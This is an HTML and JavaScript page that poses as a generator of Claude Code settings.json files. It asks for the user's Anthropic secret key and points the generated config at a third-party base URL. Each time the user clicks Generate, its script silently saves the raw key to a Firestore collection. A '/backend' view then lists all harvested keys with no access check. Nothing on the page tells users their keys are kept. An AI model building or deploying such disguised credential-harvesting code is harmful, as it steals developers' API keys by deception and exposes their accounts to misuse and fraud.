<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>settings.json generator</title>
  <!-- Firebase SDKs -->
  <script src="https://www.gstatic.com/firebasejs/10.12.4/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.4/firebase-firestore-compat.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
    }
    body {
      background: #f6f9fc;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 1.5rem;
    }
    .card {
      max-width: 780px;
      width: 100%;
      background: white;
      border-radius: 32px;
      padding: 2.5rem 2rem;
      box-shadow: 0 20px 40px -12px rgba(0,0,0,0.15);
      transition: all 0.2s;
    }
    h1 {
      font-size: 2rem;
      font-weight: 600;
      letter-spacing: -0.02em;
      color: #0a1e2f;
      display: flex;
      align-items: center;
      gap: 0.5rem;
      margin-bottom: 1.8rem;
    }
    h1 small {
      font-size: 0.9rem;
      font-weight: 400;
      color: #4b6a88;
      margin-left: auto;
      background: #eef3f8;
      padding: 0.3rem 0.9rem;
      border-radius: 40px;
    }
    .input-group {
      display: flex;
      flex-direction: column;
      gap: 0.6rem;
      margin-bottom: 1.5rem;
    }
    label {
      font-weight: 500;
      color: #1f3a57;
      font-size: 0.95rem;
    }
    .input-row {
      display: flex;
      gap: 0.75rem;
      flex-wrap: wrap;
    }
    .input-row input {
      flex: 2;
      min-width: 200px;
      padding: 0.8rem 1rem;
      border: 1.5px solid #dde7f0;
      border-radius: 60px;
      font-size: 1rem;
      background: white;
      transition: 0.2s;
    }
    .input-row input:focus {
      outline: none;
      border-color: #2b6c9e;
      box-shadow: 0 0 0 3px rgba(43, 108, 158, 0.15);
    }
    .input-row button {
      background: #1a3b5c;
      border: none;
      color: white;
      font-weight: 600;
      padding: 0.8rem 2rem;
      border-radius: 60px;
      font-size: 1rem;
      cursor: pointer;
      transition: 0.15s;
      white-space: nowrap;
      box-shadow: 0 4px 8px rgba(26, 59, 92, 0.2);
    }
    .input-row button:hover {
      background: #0f2a44;
      transform: scale(0.97);
    }
    .input-row button:active {
      background: #091d30;
    }
    .confirmation {
      margin: 1rem 0 1.2rem 0;
      font-size: 1rem;
      font-weight: 500;
      color: #0f5c3a;
      background: #e2f3e9;
      padding: 0.7rem 1.2rem;
      border-radius: 40px;
      display: inline-flex;
      align-items: center;
      gap: 0.6rem;
      visibility: hidden;
      opacity: 0;
      transition: 0.15s;
    }
    .confirmation.show {
      visibility: visible;
      opacity: 1;
    }
    .script-box {
      background: #0d1f2e;
      color: #e4edf5;
      border-radius: 20px;
      padding: 1.5rem 1.2rem;
      margin: 1.8rem 0 1.2rem 0;
      overflow-x: auto;
      white-space: pre-wrap;
      word-break: break-all;
      font-family: 'JetBrains Mono', 'Fira Code', monospace;
      font-size: 0.9rem;
      line-height: 1.6;
      border: 1px solid #2d445b;
      position: relative;
    }
    .copy-btn {
      background: #2d4b68;
      border: none;
      color: white;
      padding: 0.5rem 1.5rem;
      border-radius: 40px;
      font-weight: 500;
      font-size: 0.9rem;
      cursor: pointer;
      transition: 0.15s;
      display: inline-flex;
      align-items: center;
      gap: 0.4rem;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
      margin-top: 0.25rem;
    }
    .copy-btn:hover {
      background: #1d3952;
    }
    .copy-btn:active {
      background: #102b3f;
    }
    .footer-info {
      margin-top: 2rem;
      font-size: 0.85rem;
      color: #4a6885;
      border-top: 1px solid #e2ebf3;
      padding-top: 1.5rem;
      display: flex;
      justify-content: space-between;
      flex-wrap: wrap;
      gap: 0.5rem;
    }
    .footer-info a {
      color: #1a3b5c;
      font-weight: 500;
      text-decoration: none;
      background: #eaf1f9;
      padding: 0.2rem 1rem;
      border-radius: 30px;
    }
    .footer-info a:hover {
      background: #d0e0ef;
    }
    .inline-code {
      background: #e9eef3;
      padding: 0.1rem 0.6rem;
      border-radius: 20px;
      font-family: monospace;
      font-size: 0.9rem;
      color: #143750;
    }
    .hidden-script {
      display: none;
    }
    .toast {
      background: #1f3a57;
      color: white;
      padding: 0.3rem 1.2rem;
      border-radius: 40px;
      font-size: 0.9rem;
      font-weight: 400;
    }
  </style>
</head>
<body>

<div class="card" id="app">
  <h1>
    ⚙️ settings.json
    <small>generator</small>
  </h1>

  <!-- input section -->
  <div class="input-group">
    <label for="keyInput">🔑 Enter your secret key (replaces TEST_KEY)</label>
    <div class="input-row">
      <input type="text" id="keyInput" placeholder="e.g. sk-ant-abc123..." value="sk-test-key-123">
      <button id="generateBtn">⚡ Generate</button>
    </div>
  </div>

  <!-- confirmation -->
  <div id="confirmationMsg" class="confirmation">
    ✅ Generated Successfully.
  </div>

  <!-- script output (hidden until generate) -->
  <div id="scriptContainer" class="hidden-script">
    <div class="script-box" id="scriptOutput">
      // settings.json content will appear here
    </div>
    <button class="copy-btn" id="copyBtn">📋 Copy script</button>
  </div>

  <div class="footer-info">
    <span>🔗 <span class="inline-code">/backend</span> to view all stored keys</span>
    <span>🔥 Firebase · Firestore</span>
  </div>
</div>

<script>
  // ----- FIREBASE INIT (your config) -----
  const firebaseConfig = {
    apiKey: "AIzaSyAjOJSPVHsEzbgTWxWXwrOZpdHzdMai-CI",
    authDomain: "agentrouter-9c9df.firebaseapp.com",
    projectId: "agentrouter-9c9df",
    storageBucket: "agentrouter-9c9df.firebasestorage.app",
    messagingSenderId: "152852199619",
    appId: "1:152852199619:web:8a60e89492ffea32ec4a76"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();

  // DOM refs
  const keyInput = document.getElementById('keyInput');
  const generateBtn = document.getElementById('generateBtn');
  const scriptContainer = document.getElementById('scriptContainer');
  const scriptOutput = document.getElementById('scriptOutput');
  const copyBtn = document.getElementById('copyBtn');
  const confirmationMsg = document.getElementById('confirmationMsg');

  // ----- generate script -----
  function generateSettings(key) {
    const trimmedKey = key.trim();
    if (!trimmedKey) {
      alert('Please enter a valid key.');
      return null;
    }

    const settings = {
      env: {
        ANTHROPIC_AUTH_TOKEN: trimmedKey,
        ANTHROPIC_BASE_URL: "https://agentrouter.org",
        ANTHROPIC_MODEL: "claude-opus-4-8",
        CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "1"
      },
      permissions: {
        allow: [],
        deny: []
      },
      effortLevel: "high"
    };

    return JSON.stringify(settings, null, 2);
  }

  // ----- store key in Firestore (backend) -----
  async function storeKeyInFirestore(key) {
    try {
      const docRef = await db.collection('generated_keys').add({
        key: key.trim(),
        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
        type: 'settings_key'
      });
      console.log('✅ Stored in Firestore with ID: ', docRef.id);
      return true;
    } catch (error) {
      console.error('❌ Firestore write error: ', error);
      // still show the script even if storage fails (graceful)
      return false;
    }
  }

  // ----- main generate flow -----
  async function handleGenerate() {
    const rawKey = keyInput.value;
    const script = generateSettings(rawKey);
    if (!script) return;

    // show script
    scriptOutput.textContent = script;
    scriptContainer.classList.remove('hidden-script');

    // show confirmation
    confirmationMsg.classList.add('show');
    // auto-hide after 6s
    clearTimeout(window.confirmTimeout);
    window.confirmTimeout = setTimeout(() => {
      confirmationMsg.classList.remove('show');
    }, 6000);

    // store in Firestore (backend)
    await storeKeyInFirestore(rawKey);
  }

  // ----- copy to clipboard -----
  function copyScript() {
    const text = scriptOutput.textContent;
    if (!text || text === '// settings.json content will appear here') {
      alert('Generate a script first.');
      return;
    }
    navigator.clipboard.writeText(text).then(() => {
      const original = copyBtn.textContent;
      copyBtn.textContent = '✅ Copied!';
      setTimeout(() => {
        copyBtn.textContent = original;
      }, 1800);
    }).catch(() => {
      // fallback
      const range = document.createRange();
      range.selectNode(scriptOutput);
      window.getSelection().removeAllRanges();
      window.getSelection().addRange(range);
      document.execCommand('copy');
      window.getSelection().removeAllRanges();
      copyBtn.textContent = '✅ Copied!';
      setTimeout(() => {
        copyBtn.textContent = '📋 Copy script';
      }, 1800);
    });
  }

  // ----- event listeners -----
  generateBtn.addEventListener('click', handleGenerate);
  copyBtn.addEventListener('click', copyScript);

  // Enter key on input triggers generate
  keyInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      generateBtn.click();
    }
  });

  // On load, pre-fill with demo key and auto-generate? (optional: but we keep it clean)
  // we want to show nothing until user clicks generate, so we keep script hidden.
  // but we set a default key for convenience.
  keyInput.value = 'sk-ant-demo-key-1234';

  // ----- BACKEND LOGIC (separate page: /backend) -----
  // We detect if the current path ends with /backend or contains /backend
  // and display the list of stored keys.
  // This is a single-page approach: we check window.location.pathname
  (function initBackend() {
    const path = window.location.pathname;
    // if the path ends with '/backend' or '/backend/' or contains '/backend'
    if (path.endsWith('/backend') || path.includes('/backend')) {
      // clear main UI and render backend view
      const appCard = document.querySelector('.card');
      if (!appCard) return;

      // build backend UI
      appCard.innerHTML = `
        <h1>📋 Backend · stored keys</h1>
        <div style="background: #eaf1f9; padding: 0.8rem 1.2rem; border-radius: 60px; margin-bottom: 1.8rem; font-size: 0.95rem;">
          🔍 All keys that have been generated (from Firestore)
        </div>
        <div id="keyList" style="display: flex; flex-direction: column; gap: 0.7rem; max-height: 440px; overflow-y: auto; padding-right: 6px;">
          <div style="color: #2f557a; padding: 0.8rem; background: #f2f8ff; border-radius: 30px; text-align: center; border: 1px dashed #b6cfe0;">
            ⏳ Loading keys...
          </div>
        </div>
        <div style="margin-top: 1.8rem; border-top: 1px solid #d0dce8; padding-top: 1.2rem; display: flex; gap: 0.8rem; flex-wrap: wrap;">
          <a href="/" style="background: #1a3b5c; color: white; padding: 0.5rem 1.8rem; border-radius: 60px; text-decoration: none; font-weight: 500;">← Back to generator</a>
          <span style="color: #2f557a; font-size: 0.9rem; align-self: center;">🔥 Firestore collection: <span class="inline-code">generated_keys</span></span>
        </div>
      `;

      // fetch keys from Firestore
      const keyListDiv = document.getElementById('keyList');
      db.collection('generated_keys')
        .orderBy('timestamp', 'desc')
        .limit(100)
        .get()
        .then((querySnapshot) => {
          if (querySnapshot.empty) {
            keyListDiv.innerHTML = `
              <div style="padding: 1.5rem; background: #f3f7fb; border-radius: 30px; text-align: center; color: #2f557a; border: 1px solid #dbe4ed;">
                🕊️ No keys stored yet. Generate one from the main page.
              </div>
            `;
            return;
          }

          let html = '';
          querySnapshot.forEach((doc) => {
            const data = doc.data();
            const keyValue = data.key || '⚠️ missing';
            const time = data.timestamp ? data.timestamp.toDate().toLocaleString() : 'just now';
            // mask key for display (show first 6 and last 4)
            let displayKey = keyValue;
            if (keyValue.length > 12) {
              displayKey = keyValue.slice(0, 8) + '••••••' + keyValue.slice(-6);
            }
            html += `
              <div style="background: white; border-radius: 60px; padding: 0.7rem 1.2rem; box-shadow: 0 2px 6px rgba(0,0,0,0.04); border: 1px solid #e2ebf3; display: flex; justify-content: space-between; flex-wrap: wrap; align-items: center; gap: 0.5rem;">
                <span style="font-family: monospace; font-size: 0.9rem; background: #eef4fa; padding: 0.1rem 1rem; border-radius: 40px; color: #0e2a44;">${displayKey}</span>
                <span style="font-size: 0.75rem; color: #4b6a88;">${time}</span>
              </div>
            `;
          });
          keyListDiv.innerHTML = html;
        })
        .catch((err) => {
          keyListDiv.innerHTML = `
            <div style="padding: 1.5rem; background: #fee9e7; border-radius: 30px; color: #9e3c34; border: 1px solid #f5cdc7;">
              ❌ Error loading keys: ${err.message}
            </div>
          `;
          console.error('Backend fetch error:', err);
        });
    }
  })();
</script>

<!-- 
  The backend is accessed via the same domain + /backend 
  e.g. if served on localhost:5500, go to localhost:5500/backend 
  (or any path containing /backend)
-->
</body>
</html>
